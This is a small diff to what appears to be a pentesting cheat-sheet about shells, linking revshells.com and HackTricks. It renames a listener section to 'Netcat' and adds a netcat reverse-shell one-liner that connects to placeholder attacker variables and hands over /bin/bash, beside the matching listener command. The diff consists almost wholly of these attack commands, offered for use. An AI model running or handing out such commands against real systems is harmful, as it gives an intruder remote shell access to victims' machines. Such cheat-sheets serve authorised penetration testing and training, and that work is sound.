@@ -6,10 +6,15 @@
 - https://www.revshells.com/
 - Hacktricks: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells
 
-## Listener
+## Netcat
 
+Listener:
 ```
 nc -nvlp PortAtt
+```
+Reverse shell:
+```
+nc -nv $AttackerIp $AttackerPort -e /bin/bash
 ```
 
 ## URL encoding
